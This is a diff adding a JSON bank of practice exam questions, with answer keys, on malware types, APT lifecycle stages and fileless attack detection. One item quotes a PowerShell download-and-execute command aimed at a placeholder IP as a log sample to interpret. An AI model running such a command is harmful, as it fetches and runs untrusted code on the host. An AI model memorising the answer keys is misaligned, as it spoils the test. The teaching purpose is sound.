@@ -1,0 +1,1937 @@
+[
+  {
+    "id": "m07-q-0011",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "Which malware type spreads by inserting copies of itself into other programs or documents, and usually needs a user to run or open the infected host?",
+    "options": ["Virus", "Worm", "Trojan", "Rootkit"],
+    "answer": 0,
+    "explanation": "A virus self-replicates by modifying other programs or files, and the copy runs when the infected host is opened or run.",
+    "optionNotes": [
+      "Correct: it needs a host file and usually a user action.",
+      "A worm is self-contained and spreads without user action.",
+      "A Trojan does not replicate at all.",
+      "A rootkit hides activity; it does not infect other files."
+    ],
+    "tags": ["virus", "malware-types"],
+    "sources": ["https://csrc.nist.gov/glossary/term/virus", "https://csrc.nist.gov/pubs/sp/800/83/r1/final"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0012",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "Overnight, malware reaches hundreds of servers by exploiting an unpatched file-sharing service. Nobody opened an e-mail or ran a program. Which type of malware is this?",
+    "options": ["Macro virus", "Network service worm", "Trojan horse", "Logic bomb"],
+    "answer": 1,
+    "explanation": "SP 800-83 calls this a network service worm: it exploits a service flaw to reach new hosts with no user interaction, as WannaCry did over SMBv1.",
+    "optionNotes": [
+      "A macro virus lives in documents and needs them to be opened.",
+      "Correct: self-contained, self-propagating through a vulnerable service.",
+      "A Trojan needs the user to install it and does not spread by itself.",
+      "A logic bomb waits for a condition; it does not spread."
+    ],
+    "tags": ["worm"],
+    "sources": [
+      "https://csrc.nist.gov/pubs/sp/800/83/r1/final",
+      "https://www.cisa.gov/news-events/alerts/2017/05/12/indicators-associated-wannacry-ransomware"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0013",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "In NIST SP 800-83, what is a multipartite virus?",
+    "options": [
+      "A virus split across several e-mail attachments",
+      "A virus that infects only Office macros",
+      "A virus that combines file infector and boot sector behavior",
+      "A virus that changes its encryption with every copy"
+    ],
+    "answer": 2,
+    "explanation": "SP 800-83 lists three compiled virus types: file infector, boot sector, and multipartite (both at once).",
+    "optionNotes": [
+      "Nothing in the definition involves split attachments.",
+      "That is a macro virus.",
+      "Correct: it infects both executable files and boot areas.",
+      "That describes polymorphic malware."
+    ],
+    "tags": ["virus-types"],
+    "sources": ["https://csrc.nist.gov/pubs/sp/800/83/r1/final", "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-83r1.pdf"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0014",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "After a user opens a spreadsheet from an unknown sender, the same malicious code appears in the user's default template and in every workbook opened afterwards. Which type of malware is this?",
+    "options": ["Rootkit", "Boot sector virus", "Network service worm", "Macro virus"],
+    "answer": 3,
+    "explanation": "Macro viruses are interpreted viruses that spread through documents and templates of the application that runs them.",
+    "optionNotes": [
+      "A rootkit hides an attacker; it does not infect documents.",
+      "A boot sector virus infects the boot record, not documents.",
+      "A network service worm exploits a service, not documents.",
+      "Correct: it uses the application's macro language to infect documents and templates."
+    ],
+    "tags": ["virus-types", "macro"],
+    "sources": ["https://csrc.nist.gov/glossary/term/macro_virus", "https://learn.microsoft.com/en-us/defender-endpoint/malware/macro-malware"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0015",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "What is the key difference between a Trojan and a virus?",
+    "options": [
+      "A Trojan only runs on Linux; a virus only runs on Windows",
+      "A Trojan does not replicate; a virus copies itself into other files",
+      "A Trojan always encrypts files; a virus never does",
+      "A Trojan spreads over the network by itself; a virus cannot"
+    ],
+    "answer": 1,
+    "explanation": "A Trojan pretends to be useful and hides a malicious function, but it never makes copies of itself.",
+    "optionNotes": [
+      "Both exist on every major platform.",
+      "Correct: non-replication is the defining trait of a Trojan.",
+      "Encryption is a ransomware behavior, not the difference between these two.",
+      "Self-spreading over the network describes a worm."
+    ],
+    "tags": ["trojan", "malware-types"],
+    "sources": ["https://csrc.nist.gov/glossary/term/trojan_horse", "https://learn.microsoft.com/en-us/defender-endpoint/malware/trojans-malware"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0016",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "On a compromised server, `dir` and Task Manager show nothing unusual, but when the disk is examined from a clean boot DVD, extra files and a hidden service appear. What is the MOST likely cause?",
+    "options": [
+      "A mass-mailing worm",
+      "A logic bomb that has not triggered yet",
+      "Adware bundled with a free tool",
+      "A rootkit that hides files and processes from the running OS"
+    ],
+    "answer": 3,
+    "explanation": "Rootkits alter the host so it hides the attacker. That is why SP 800-83 recommends analysis from a trusted toolkit and usually a rebuild.",
+    "optionNotes": [
+      "A mass-mailing worm sends itself by e-mail.",
+      "A logic bomb waits for a trigger but does not hide files from the OS.",
+      "Adware shows ads; it does not hide from the OS.",
+      "Correct: the running OS lies to its own tools; a trusted environment reveals the truth."
+    ],
+    "tags": ["rootkit"],
+    "sources": ["https://csrc.nist.gov/glossary/term/rootkit", "https://csrc.nist.gov/pubs/sp/800/83/r1/final"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0017",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "A developer adds hidden code to the payroll system that deletes the employee database if his name is ever removed from the payroll table. What is this?",
+    "options": ["Spyware", "Worm", "Logic bomb", "Botnet agent"],
+    "answer": 2,
+    "explanation": "A logic bomb sits inside legitimate software and triggers when a specified condition occurs, such as a date or an event.",
+    "optionNotes": [
+      "Nothing collects information.",
+      "Nothing spreads.",
+      "Correct: malicious code that fires when a condition is met.",
+      "No remote C2 server is involved."
+    ],
+    "tags": ["logic-bomb", "insider-threat"],
+    "sources": ["https://csrc.nist.gov/glossary/term/logic_bomb", "https://csrc.nist.gov/glossary/term/virus"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0018",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "Thousands of home security cameras flood a website with traffic. They had been taken over by logging in over Telnet with factory-default passwords. What are the cameras part of?",
+    "options": ["A botnet", "A rootkit", "A polymorphic virus", "A logic bomb"],
+    "answer": 0,
+    "explanation": "Mirai built its botnet from IoT devices with default credentials and used it for large DDoS attacks.",
+    "optionNotes": [
+      "Correct: many compromised devices obey one C2 server, like Mirai.",
+      "A rootkit hides activity on one host.",
+      "Nothing here is a virus changing its code.",
+      "No trigger condition is involved."
+    ],
+    "tags": ["botnet", "iot"],
+    "sources": [
+      "https://www.cisa.gov/news-events/alerts/2016/10/14/heightened-ddos-threat-posed-mirai-and-other-botnets",
+      "https://csrc.nist.gov/glossary/term/botnet"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0019",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "ec-council-term",
+    "difficulty": 2,
+    "stem": "Which malware component carries the payload inside itself and installs it on the victim, without downloading anything?",
+    "options": ["Wrapper", "Downloader", "Crypter", "Dropper"],
+    "answer": 3,
+    "explanation": "EC-Council separates the dropper (payload inside) from the downloader (payload fetched later). Emotet was widely used as a dropper for other malware.",
+    "optionNotes": [
+      "A wrapper joins a Trojan to a legitimate program.",
+      "A downloader fetches the payload from the internet.",
+      "A crypter encrypts code to evade scanning.",
+      "Correct: the payload is embedded and dropped on the host."
+    ],
+    "tags": ["malware-components", "ec-council-specific"],
+    "sources": [
+      "https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/",
+      "https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a"
+    ],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0020",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "An attacker combines a Trojan with a genuine game installer so that both run when the victim installs the game. What is the tool that joins them called?",
+    "options": ["Exploit kit", "Packer", "Wrapper (binder)", "Keylogger"],
+    "answer": 2,
+    "explanation": "Wrappers or binders hide a Trojan behind a program the user wants, so the installation looks normal.",
+    "optionNotes": [
+      "An exploit kit attacks browser vulnerabilities.",
+      "A packer compresses one executable to hide its code.",
+      "Correct: it binds two executables into one.",
+      "A keylogger records keystrokes."
+    ],
+    "tags": ["malware-components", "ec-council-specific"],
+    "sources": ["https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/", "https://csrc.nist.gov/glossary/term/trojan_horse"],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0021",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "A small program runs first on the victim and then fetches the real payload from an attacker's web server. What is this program called?",
+    "options": ["Downloader", "Dropper", "Rootkit", "Logic bomb"],
+    "answer": 0,
+    "explanation": "A downloader keeps the first stage small and lets the attacker change the payload at any time.",
+    "optionNotes": [
+      "Correct: it pulls the payload from the internet (ATT&CK T1105).",
+      "A dropper already carries the payload inside.",
+      "A rootkit hides activity.",
+      "A logic bomb waits for a condition."
+    ],
+    "tags": ["malware-components"],
+    "sources": ["https://attack.mitre.org/techniques/T1105/", "https://learn.microsoft.com/en-us/defender-endpoint/malware/understanding-malware"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0022",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 3,
+    "stem": "Which kind of malware rewrites its entire code on each new copy, so that no constant decryption routine is left to match?",
+    "options": ["Polymorphic", "Metamorphic", "Multipartite", "Macro"],
+    "answer": 1,
+    "explanation": "Polymorphic code changes its wrapper; metamorphic code rewrites itself. Both defeat simple signatures, so emulation and behavior detection are needed.",
+    "optionNotes": [
+      "Polymorphic malware changes its encryption or appearance but keeps a constant core.",
+      "Correct: the whole body changes, not just its encryption.",
+      "Multipartite describes infecting both files and boot sectors.",
+      "Macro describes where the virus lives, not how it changes."
+    ],
+    "tags": ["virus-types", "evasion", "ec-council-specific"],
+    "sources": ["https://attack.mitre.org/techniques/T1027/", "https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/"],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0023",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "ec-council-term",
+    "difficulty": 2,
+    "stem": "In EC-Council's APT lifecycle, which stage comes directly after initial intrusion?",
+    "options": ["Preparation", "Expansion", "Cleanup", "Search and exfiltration"],
+    "answer": 1,
+    "explanation": "Order: preparation, initial intrusion, expansion, persistence, search and exfiltration, cleanup.",
+    "optionNotes": [
+      "Preparation comes before the intrusion.",
+      "Correct: the attacker widens access across the network.",
+      "Cleanup is the last stage.",
+      "Search and exfiltration comes after expansion and persistence."
+    ],
+    "tags": ["apt", "ec-council-specific"],
+    "sources": [
+      "https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/",
+      "https://csrc.nist.gov/glossary/term/advanced_persistent_threat"
+    ],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0024",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "An intrusion team spent 14 months inside a ministry's network. Before leaving, it deleted its tools and wiped the logs it had touched. In EC-Council's APT lifecycle, what is this last step?",
+    "options": ["Initial intrusion", "Expansion", "Cleanup", "Preparation"],
+    "answer": 2,
+    "explanation": "The APT lifecycle ends with cleanup, which hides the operation and slows the investigation.",
+    "optionNotes": [
+      "Initial intrusion is how they got in.",
+      "Expansion widens access; it is not about leaving.",
+      "Correct: removing traces is the final stage.",
+      "Preparation happens before any contact."
+    ],
+    "tags": ["apt", "ec-council-specific"],
+    "sources": [
+      "https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/",
+      "https://www.cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats"
+    ],
+    "verify": true,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0025",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "command-output",
+    "difficulty": 2,
+    "stem": "Autoruns shows a new entry under `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` named `updater` with the path `C:\\Users\\Public\\svch0st.exe`. What is the attacker MOST likely doing?",
+    "options": [
+      "Deleting shadow copies",
+      "Encrypting the user's files for ransom",
+      "Scanning the network for open SMB ports",
+      "Keeping malware running at each logon through a registry run key"
+    ],
+    "answer": 3,
+    "explanation": "Run keys are a classic persistence point, and a look-alike name in a user-writable folder is a strong sign of masquerading (T1036).",
+    "optionNotes": [
+      "Shadow copy deletion uses vssadmin or wmic, not a Run key.",
+      "Nothing in a Run key encrypts files.",
+      "A Run entry does not show network scanning.",
+      "Correct: Run keys start programs at logon (ATT&CK T1547.001), and the name imitates svchost."
+    ],
+    "tags": ["persistence", "command-output"],
+    "sources": [
+      "https://attack.mitre.org/techniques/T1547/001/",
+      "https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns",
+      "https://attack.mitre.org/techniques/T1036/"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0026",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "command-output",
+    "difficulty": 1,
+    "stem": "A mail gateway log shows an attachment named `Invoice_2026.pdf.exe` with a PDF icon. What trick is the sender using?",
+    "options": [
+      "A double extension that hides an executable behind a document name",
+      "A polymorphic engine that changes the file each time",
+      "A domain generation algorithm",
+      "Process hollowing"
+    ],
+    "answer": 0,
+    "explanation": "Double extensions and fake icons are masquerading (ATT&CK T1036) aimed at getting the user to run the file (T1204.002).",
+    "optionNotes": [
+      "Correct: Windows may hide the real .exe extension, so the user sees a PDF.",
+      "Polymorphism changes code, not the file name.",
+      "A DGA creates C2 domain names.",
+      "Process hollowing happens in memory after execution."
+    ],
+    "tags": ["masquerading", "trojan"],
+    "sources": ["https://attack.mitre.org/techniques/T1036/", "https://attack.mitre.org/techniques/T1204/002/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0027",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "According to CISA's 2020 advisory, how is Emotet BEST described?",
+    "options": [
+      "A browser plug-in that shows advertisements",
+      "A boot sector virus spread by USB drives",
+      "Ransomware that only encrypts databases",
+      "A Trojan spread by phishing that also drops other malware and spreads within networks"
+    ],
+    "answer": 3,
+    "explanation": "Emotet shows how modern malware is blended: a Trojan, a spreader and a loader in one.",
+    "optionNotes": [
+      "It is not adware.",
+      "Emotet spreads by e-mail and network methods, not boot sectors.",
+      "Emotet delivered other payloads; it was not itself database ransomware.",
+      "Correct: phishing delivery, worm-like spread, and use as a dropper for other malware."
+    ],
+    "tags": ["emotet", "trojan"],
+    "sources": ["https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-280a", "https://attack.mitre.org/software/S0367/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0028",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 3,
+    "stem": "Infected hosts contact a different C2 domain every day, chosen from thousands of random-looking names that the malware computes. Blocking yesterday's domain does not help. What technique is this?",
+    "options": ["Process hollowing", "Domain generation algorithm (DGA)", "Software packing", "Registry run key persistence"],
+    "answer": 1,
+    "explanation": "DGAs make blocklists weak. Defenders detect the pattern (many failed lookups of random names) or predict the list after reversing the algorithm.",
+    "optionNotes": [
+      "Process hollowing hides code inside a legitimate process.",
+      "Correct: the malware and the attacker compute the same domain list (T1568.002).",
+      "Packing hides code in the file, not the C2 address.",
+      "A run key starts malware at logon; it does not choose domains."
+    ],
+    "tags": ["c2", "dga"],
+    "sources": ["https://attack.mitre.org/techniques/T1568/002/", "https://attack.mitre.org/tactics/TA0011/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0029",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "Which type of malware records everything a user types in order to capture passwords and messages?",
+    "options": ["Keylogger", "Adware", "Worm", "Bootkit"],
+    "answer": 0,
+    "explanation": "Keyloggers are a common spyware component and send what they capture to the attacker.",
+    "optionNotes": [
+      "Correct: keystroke logging (ATT&CK T1056.001).",
+      "Adware displays ads.",
+      "A worm spreads itself.",
+      "A bootkit runs before the OS loads."
+    ],
+    "tags": ["spyware", "keylogger"],
+    "sources": ["https://attack.mitre.org/techniques/T1056/001/", "https://csrc.nist.gov/pubs/sp/800/83/r1/final"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0030",
+    "module": 7,
+    "section": "Malware and APT Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 1,
+    "stem": "Several laptops run hot with the CPU at 95%, and an unknown process keeps connecting to a cryptocurrency mining pool. What is the MOST likely infection?",
+    "options": ["A boot sector virus", "A logic bomb", "A coin miner (cryptojacking)", "A keylogger"],
+    "answer": 2,
+    "explanation": "Resource hijacking steals CPU or GPU time; high load plus mining pool traffic is the tell.",
+    "optionNotes": [
+      "Boot sector viruses do not explain mining traffic.",
+      "A logic bomb is dormant until triggered.",
+      "Correct: it hijacks computing resources to mine (ATT&CK T1496).",
+      "Keyloggers are quiet and light on CPU."
+    ],
+    "tags": ["coin-miner"],
+    "sources": ["https://attack.mitre.org/techniques/T1496/", "https://learn.microsoft.com/en-us/defender-endpoint/malware/coinminer-malware"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0031",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "What does \"living off the land\" mean in an attack?",
+    "options": [
+      "Attacking only systems on the same physical site",
+      "Using tools already built into the target system instead of custom malware",
+      "Stealing electricity to mine cryptocurrency",
+      "Hiding malware inside the BIOS"
+    ],
+    "answer": 1,
+    "explanation": "LOTL techniques blend with normal administration, which is why CISA's guidance stresses logging and behavior baselines.",
+    "optionNotes": [
+      "Location has nothing to do with the term.",
+      "Correct: PowerShell, WMI, certutil and similar trusted tools.",
+      "That describes cryptojacking.",
+      "That describes firmware malware."
+    ],
+    "tags": ["lotl", "fileless"],
+    "sources": [
+      "https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques",
+      "https://lolbas-project.github.io/"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0032",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 3,
+    "stem": "Attackers store a PowerShell command in the WMI repository and register a WMI filter that runs it every hour. No executable is written. In Microsoft's fileless classification, which type is this?",
+    "options": [
+      "Type II: indirect file activity",
+      "Type I: no file activity",
+      "Type III: files required to operate",
+      "Not fileless, because a script is involved"
+    ],
+    "answer": 0,
+    "explanation": "Microsoft's three types: I no file activity, II indirect file activity (WMI, registry), III files required to operate.",
+    "optionNotes": [
+      "Correct: the WMI repository is a file, but the malware never writes its own file.",
+      "Type I needs no file at all, such as a network exploit straight into memory.",
+      "Type III needs files to run, such as a dropped file with a registry handler.",
+      "Scripts stored in WMI are a standard fileless technique."
+    ],
+    "tags": ["fileless"],
+    "sources": ["https://learn.microsoft.com/en-us/defender-endpoint/malware/fileless-threats", "https://attack.mitre.org/techniques/T1546/003/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0033",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "command-output",
+    "difficulty": 2,
+    "stem": "A SIEM shows PowerShell event ID 4104 with the script text `IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a')`. What does this show?",
+    "options": [
+      "The host was scanned by a network worm",
+      "A scheduled backup copied files to a web server",
+      "A user changed their password",
+      "PowerShell downloaded code and ran it directly in memory"
+    ],
+    "answer": 3,
+    "explanation": "Event 4104 (script block logging) records the script PowerShell actually ran. Download-and-invoke is a classic fileless pattern.",
+    "optionNotes": [
+      "This is code running on the host, not an incoming scan.",
+      "Nothing is uploaded or backed up.",
+      "Password changes produce different events.",
+      "Correct: a download cradle: fetch text and execute it without saving a file."
+    ],
+    "tags": ["powershell", "fileless", "logging"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows",
+      "https://attack.mitre.org/techniques/T1059/001/"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0034",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 2,
+    "stem": "Which Windows event ID records PowerShell script block logging?",
+    "options": ["1102", "4624", "4104", "7045"],
+    "answer": 2,
+    "explanation": "Script block logging records the content of scripts, including de-obfuscated code, which makes it a key source for fileless attacks.",
+    "optionNotes": [
+      "1102 means the Security log was cleared.",
+      "4624 is a successful logon.",
+      "Correct: in the Microsoft-Windows-PowerShell/Operational log.",
+      "7045 is a new service installed."
+    ],
+    "tags": ["powershell", "logging"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows",
+      "https://attack.mitre.org/techniques/T1059/001/"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0035",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 2,
+    "stem": "A defender wants a public catalog of legitimate Windows binaries and scripts that attackers abuse, with the ATT&CK techniques they enable. Which resource fits?",
+    "options": ["ExploitDB", "OWASP Top 10", "CVE list", "LOLBAS project"],
+    "answer": 3,
+    "explanation": "LOLBAS covers Windows; GTFOBins is the Unix equivalent. Both help defenders decide what to monitor or block.",
+    "optionNotes": [
+      "ExploitDB archives exploits for vulnerabilities.",
+      "OWASP Top 10 ranks web application risks.",
+      "CVE lists vulnerabilities, not abused built-in tools.",
+      "Correct: Living Off The Land Binaries, Scripts and Libraries."
+    ],
+    "tags": ["lotl", "tools"],
+    "sources": ["https://lolbas-project.github.io/", "https://gtfobins.github.io/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0036",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 3,
+    "stem": "What is process hollowing?",
+    "options": [
+      "Starting a legitimate process suspended, replacing its memory with malicious code, then resuming it",
+      "Deleting a process's executable from disk after it starts",
+      "Draining a process's CPU time to mine cryptocurrency",
+      "Encrypting a process's memory to protect it from debuggers"
+    ],
+    "answer": 0,
+    "explanation": "Hollowing lets malicious code run under a trusted process name, so process lists look normal.",
+    "optionNotes": [
+      "Correct: ATT&CK T1055.012.",
+      "Deleting the file is a cleanup trick, not hollowing.",
+      "That is resource hijacking.",
+      "That describes an anti-debugging protection."
+    ],
+    "tags": ["process-injection"],
+    "sources": ["https://attack.mitre.org/techniques/T1055/012/", "https://attack.mitre.org/techniques/T1055/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0037",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "A company wants to stop users from running arbitrary PowerShell code while admins keep their approved scripts. Which control fits BEST?",
+    "options": [
+      "Uninstall the antivirus to reduce conflicts",
+      "Enforce Constrained Language Mode through App Control for Business or AppLocker",
+      "Block all outbound HTTPS traffic",
+      "Rename powershell.exe"
+    ],
+    "answer": 1,
+    "explanation": "PowerShell enforces Constrained Language Mode when an application control policy is in place, limiting dangerous language features.",
+    "optionNotes": [
+      "Removing antivirus weakens every other defense.",
+      "Correct: untrusted code gets a restricted language; allowed scripts run normally.",
+      "Blocking HTTPS breaks the business and does not stop local abuse.",
+      "Renaming is trivial to get around."
+    ],
+    "tags": ["powershell", "countermeasures"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes",
+      "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/appcontrol"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0038",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "command-output",
+    "difficulty": 3,
+    "stem": "Sysmon event ID 8 shows `SourceImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE` and `TargetImage: C:\\Windows\\explorer.exe`. What does this MOST likely indicate?",
+    "options": [
+      "A new network connection from Word",
+      "A normal document autosave",
+      "Code injection from Word into another process",
+      "A registry value set by Word"
+    ],
+    "answer": 2,
+    "explanation": "Word creating a thread inside Explorer has no business reason; it fits process injection (ATT&CK T1055) after a malicious document.",
+    "optionNotes": [
+      "Network connections are event 3.",
+      "Autosave writes files; it does not create threads in Explorer.",
+      "Correct: event 8 is CreateRemoteThread, a common injection step.",
+      "Registry value sets are event 13."
+    ],
+    "tags": ["sysmon", "process-injection"],
+    "sources": ["https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon", "https://attack.mitre.org/techniques/T1055/"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0039",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "scenario",
+    "difficulty": 2,
+    "stem": "A workstation keeps beaconing to a known C2 address, but two full disk scans with up-to-date antivirus find nothing. What is the BEST next step?",
+    "options": [
+      "Capture and analyze the system's memory and check EDR telemetry",
+      "Declare the host clean because the scans passed",
+      "Delete the user's documents folder",
+      "Update the antivirus signatures and scan a third time"
+    ],
+    "answer": 0,
+    "explanation": "When disk scans are clean but behavior is malicious, look at memory (for example with Volatility), the registry, WMI and process telemetry.",
+    "optionNotes": [
+      "Correct: fileless payloads live in memory, where disk scans do not look.",
+      "Beaconing is evidence of infection whatever the disk scan says.",
+      "Deleting documents destroys data and removes nothing in memory.",
+      "Another disk scan repeats the blind spot."
+    ],
+    "tags": ["fileless", "memory-forensics"],
+    "sources": [
+      "https://volatility3.readthedocs.io/en/latest/",
+      "https://learn.microsoft.com/en-us/defender-endpoint/overview-endpoint-detection-response",
+      "https://learn.microsoft.com/en-us/defender-endpoint/malware/fileless-threats"
+    ],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0040",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "recall",
+    "difficulty": 1,
+    "stem": "Where can fileless malware keep its code for persistence without writing a separate program file?",
+    "options": ["In the monitor's firmware", "In the CPU cache", "In the network card's MAC address", "In a Windows Registry value"],
+    "answer": 3,
+    "explanation": "Fileless storage uses places that are not ordinary files: the registry, WMI repository, event logs, or shared memory on Linux.",
+    "optionNotes": [
+      "Monitor firmware is not a practical storage location.",
+      "The CPU cache is volatile and not a storage location for persistence.",
+      "A MAC address cannot hold code.",
+      "Correct: ATT&CK T1027.011 lists the registry, event logs and the WMI repository."
+    ],
+    "tags": ["fileless", "persistence"],
+    "sources": ["https://attack.mitre.org/techniques/T1027/011/", "https://learn.microsoft.com/en-us/defender-endpoint/malware/fileless-threats"],
+    "verify": false,
+    "rev": 1
+  },
+  {
+    "id": "m07-q-0041",
+    "module": 7,
+    "section": "Fileless Malware Concepts",
+    "domain": "D3",
+    "pool": "practice",
+    "type": "tool",
+    "difficulty": 2,
+    "stem": "A phishing document runs a macro that starts `cmd.exe`, which then launches PowerShell. Which Microsoft Defender feature blocks this chain at the first step?",
+    "options": [
+      "Windows Update for Business",
+      "BitLocker drive encryption",
+      "Attack surface reduction rule that blocks Office apps from creating child processes",
+      "Credential Guard"
+    ],
+    "answer": 2,
+    "explanation": "ASR rules target common malware behaviors; blocking Office child processes defeats many macro-based chains.",
+    "optionNotes": [
+      "Update management patches systems; it does not block this behavior.",
+      "BitLocker protects data at rest.",
+      "Correct: Word cannot spawn cmd.exe, so the chain stops.",
+      "Credential Guard protects credentials in memory."
+    ],
+    "tags": ["asr", "macro"],
+    "sources": [
+      "https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference",
+      "https://learn.microsoft.com/en-us/defender-endpoint/malware/macro-malware"
